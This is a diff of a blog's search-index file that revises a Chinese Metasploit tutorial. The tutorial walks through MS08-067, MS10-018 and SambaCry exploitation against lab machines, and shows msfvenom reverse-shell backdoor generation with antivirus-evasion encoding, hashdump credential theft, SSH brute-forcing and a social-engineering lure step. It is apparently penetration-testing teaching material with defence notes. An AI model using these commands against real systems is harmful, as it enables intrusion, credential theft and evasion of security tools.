@@ -4471,16 +4471,11 @@ hydra -t 3 -l admin -P password.txt -s 80 192.168.0.47 http-post-form &quot;/wz/
   <entry>
     <title>MSF的使用以及漏洞复现</title>
     <url>/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
-    <content><![CDATA[一、MSF基础概述
-定义Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
-主要功能：漏洞利用、载荷生成、连接监听
+    <content><![CDATA[一、MSF 是什么？基础概述定义：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
+主要功能：漏洞利用、生成攻击载荷、监听反弹连接、后渗透控制； 常用组件为msfconsole交互控制台、msfvenom后门生成工具。
 安装目录（Kali默认）/usr/share/metasploit-framework/
 
-
-
 核心目录分工
-
-
 
 
 目录
@@ -4508,17 +4503,144 @@ tools
 独立编码、漏洞分析小工具
 
 
-
 modules六大子模块详解
+Auxiliary 辅助模块
+目录：modules&#x2F;auxiliary&#x2F;
+作用：不执行漏洞提权、不反弹shell；信息收集、扫描、爆破、嗅探、验证
+特点：无payload，单纯工具类，绝大多数不需要目标存在漏洞
+常见分类：
+端口扫描：auxiliary/scanner/portscan/tcp
+弱口令爆破：ssh、ftp、mysql、rdp爆破
+漏洞探测（只检测不利用）：smb版本探测、CVE漏洞扫描
+DNS枚举、ARP嗅探、目录扫描、服务识别
+
+
+使用场景：前期信息收集阶段；探测目标是否存在漏洞，不获取权限。
+
+示例 1：TCP 端口扫描
+use auxiliary/scanner/portscan/tcpshow optionsset RHOSTS 192.168.1.0/24   # 目标IP/网段set PORTS 1-1000set THREADS 10               # 线程run
+
+示例 2：SMB 版本探测（永恒之蓝前期探测）
+use auxiliary/scanner/smb/smb_versionset RHOSTS 192.168.1.105run
+
+示例 3：SSH 弱口令爆破
+use auxiliary/scanner/ssh/ssh_loginset RHOSTS 192.168.1.100set USER_FILE /usr/share/wordlists/metasploit/default_users_for_smb.txtset PASS_FILE /usr/share/wordlists/metasploit/password.lstset THREADS 5run
+
+Exploits 漏洞利用模块（EXP）
+目录：modules&#x2F;exploits&#x2F;
+作用：利用程序漏洞触发内存溢出、命令执行、文件上传等缺陷，开辟通道
+特点：必须搭配Payload使用！exp负责打通漏洞通道，payload负责执行代码
+原理：漏洞本身只能制造程序异常，不知道要执行什么操作；exp &#x3D; 开锁，payload &#x3D; 你要放进房间的指令（反弹shell、创建用户等）
+分类：
+Windows漏洞：MS08-067、MS17-010（永恒之蓝）
+Web漏洞：远程代码执行RCE
+各类应用漏洞：Tomcat、Apache、路由器漏洞
 
 
 
-auxiliary：辅助模块，扫描、嗅探、弱口令爆破、漏洞探测
-encoders：编码器，Payload变形免杀，绕过杀毒&#x2F;IDS
-exploits：漏洞利用EXP核心库，触发漏洞获取权限
-nops：空指令生成器，稳定溢出攻击内存执行
-payloads：攻击载荷，漏洞触发后执行反弹Shell、Meterpreter
-post：后渗透模块，提权、抓密码、持久化、内网横向移动
+Payloads 攻击载荷（Shellcode）
+目录：modules&#x2F;payloads&#x2F;
+作用：漏洞利用成功后，在目标机器上最终执行的代码
+Payload三大类型
+Single完整代码一体，不需要外部连接，一次性执行。例：windows/adduser → 直接在目标新建管理员账号
+Stager体积短小，先运行小段代码，主动回连攻击机，再下载完整shellcode。优点：体积小，容易绕过缓冲区长度限制典型：reverse_tcp 反向连接
+StageStager连接成功后，后续下载运行的大代码，如Meterpreter
+
+
+高频Payload：
+windows/meterpreter/reverse_tcp Windows反向Meterpreter（最常用）
+linux/x86/meterpreter/reverse_tcp Linux反弹
+cmd/unix/reverse_netcat 简易nc反弹shell
+
+
+
+
+Meterpreter属于高级payload，内存运行、无落地文件、功能极强
+
+Encoders 编码器（免杀编码）
+目录：modules&#x2F;encoders&#x2F;
+作用：对payload进行编码变形，规避杀毒软件、IDS、防火墙特征检测
+核心原理：原始shellcode存在固定特征，容易被AV查杀；编码器替换字符、改变二进制序列，运行时自动解码还原。
+经典编码器：x86/shikata_ga_nai 万花筒编码器
+
+# msfvenom示例，编码5次msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe &gt; shell.exe
+
+Nops 空指令模块（NOP生成器）
+目录：modules&#x2F;nops&#x2F;
+
+
+NOP &#x3D; No Operation，CPU空指令 0x90作用：生成一串无任何功能的空指令，填充缓冲区，用于缓冲区溢出漏洞开发
+
+
+原理：溢出利用时，很难精准命中shellcode起始地址；大量0x90滑行区，只要跳转进NOP区域，CPU一路空滑，最终执行payload。
+适用场景：漏洞研究、自行编写EXP
+
+Post 后渗透模块
+目录：modules&#x2F;post&#x2F;
+触发时机：已经拿到目标权限（Meterpreter会话）之后使用
+作用：权限维持、信息窃取、内网横向移动、提权、痕迹清理
+常用分类：
+权限提升：post/windows/escalate/getsystem
+信息收集：获取密码、浏览器记录、系统账号、进程
+持久化后门：创建服务、注册表自启动
+内网渗透：ARP扫描、路由转发、抓取凭证
+清除日志、dump内存密码（mimikatz集成在内）
+
+
+使用方式：
+
+方式1：meterpreter会话内直接run
+run post/windows/gather/hashdump
+
+方式2：background会话后use调用
+background				# 将会话放到后台，得到session编号use post/windows/gather/credentials/windows_autologinset SESSION 1run
+
+
+六大模块极简对比记忆表
+
+
+模块
+核心用途
+使用阶段
+是否需要Payload
+
+
+
+Auxiliary
+扫描、爆破、漏洞探测
+渗透前期信息收集
+❌ 不需要
+
+
+Exploits
+利用漏洞创建入口(EXP)
+漏洞攻击阶段
+✅ 必须搭配payload
+
+
+Payloads
+目标主机执行代码(shell&#x2F;meterpreter)
+exploit执行后
+——
+
+
+Encoders
+Payload编码变形、规避特征
+生成木马阶段
+编码payload
+
+
+Nops
+生成NOP滑行区，溢出开发
+EXP编写研究
+辅助溢出开发
+
+
+Post
+拿到权限后内网操作、提权、持久化
+获取会话之后
+已有meterpreter会话
+
 
 二、MSF控制台基础命令
 
@@ -4593,7 +4715,7 @@ msfconsole
 
 
 
-earch
+search
 
 
 
@@ -4605,13 +4727,13 @@ exit
 
 
 退出 msf
-三、MSF 渗透测试(一) MS08-0671. 简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
+三、MSF 渗透测试(一) MS08-067简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
 攻击者可通过 SMB（端口445） 发送特制RPC请求，触发 NetPathCanonicalize 函数的缓冲区溢出，从而在无需身份验证的情况下执行任意代码。该漏洞曾被蠕虫病毒 Conficker 大规模利用。
-2. 命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
+命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
 
 
 
-3. 攻击步骤环境：WinXP SP3，445端口开放
+攻击步骤环境：WinXP SP3，445端口开放
 前提条件：已知目标机的 IP 地址 192.168.23.136
 
 
@@ -4645,17 +4767,17 @@ run
 shell
 
 
-4. 防御
+防御
 安装KB958644补丁
 关闭445端口 或限制SMB服务对外访问。
 部署防火墙与入侵检测系统，过滤异常RPC&#x2F;SMB流量。
 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。
 
-(二) MS10-018 IE浏览器1. 简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。
+(二) MS10-018 IE浏览器简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。
 利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线
-2. 命令行汇总# 1. 静默启动MSFmsfconsole -q# 2. 搜索MS10-018 IE漏洞模块search ms10-018# 3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 4. 查看模块配置项show options# 5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 8. 启动攻击服务run# 9. 查看所有被控主机会话sessions# 10. 接入ID为1的受害机会话sessions -i 1# 11. 调出目标系统cmd命令行shell# 12. 切回meterpreterexit
+命令行汇总# 1. 静默启动MSFmsfconsole -q# 2. 搜索MS10-018 IE漏洞模块search ms10-018# 3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 4. 查看模块配置项show options# 5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 8. 启动攻击服务run# 9. 查看所有被控主机会话sessions# 10. 接入ID为1的受害机会话sessions -i 1# 11. 调出目标系统cmd命令行shell# 12. 切回meterpreterexit
 
-3. 攻击步骤环境：WinXP IE6&#x2F;7
+攻击步骤环境：WinXP IE6&#x2F;7
 前提条件：已知目标机的 IP 地址 192.168.23.136
 
 
@@ -4733,7 +4855,7 @@ set LPORT 9999
 run
 
 
-出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。
+出现的 url 要通过社工等方法让目标机进行访问。
 这里我们直接让目标机访问这个 url
 
 
@@ -4755,16 +4877,16 @@ sessions -i 1
 shell
 
 
-4. 防御
+防御
 安装KB980182补丁
 禁用危险ActiveX
 开启DEP&#x2F;ASLR内存保护。
 
-(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）1. 简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。
+(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。
 漏洞的核心在于 Samba 的 is_known_pipename () 函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。
-2. 命令行汇总# 1. 启动MSF控制台msfconsole -q# 2. 搜索漏洞模块search CVE-2017-7494# 3. 加载漏洞利用模块use exploit/linux/samba/is_known_pipename# 4. 设置目标IPset RHOSTS xxxx# 5. 执行攻击run
+命令行汇总# 1. 启动MSF控制台msfconsole -q# 2. 搜索漏洞模块search CVE-2017-7494# 3. 加载漏洞利用模块use exploit/linux/samba/is_known_pipename# 4. 设置目标IPset RHOSTS xxxx# 5. 执行攻击run
 
-3. 攻击步骤
+攻击步骤
 环境搭建：Vulhub搭建Samba 3.5~4.6.4
 搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行docker-compose up -d后台启动漏洞容器。
 部署教程：https://blog.csdn.net/m0_73909316&#x2F;article&#x2F;details&#x2F;142954056
@@ -4840,24 +4962,24 @@ run
 id
 
 
-4. 防御
+防御
 升级Samba版本
 禁用nt pipe
 共享目录设只读
 防火墙限制445端口。
 
-(四) msfvenom 生成后门木马1. Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
-2. 使用场景Msfvenom常用于红队渗透测试和社会工程学攻击中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
-3. 核心参数
+(四) msfvenom 生成后门木马Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
+使用场景Msfvenom常用于红队渗透测试和社会工程学攻击中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
+核心参数
 -p 指定使用的攻击 payload（后门类型），例如windows/meterpreter/reverse_tcp
 LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
 LPORT 攻击机开启监听的端口
 -f 文件输出格式（elf、exe、so、raw 等）
 -o 保存生成的后门文件（output）
 
-4. 基础语法msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
+基础语法msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
 
-5. Windows木马示例
+Windows木马示例
 查看攻击机的 IP 192.168.23.131
 
 
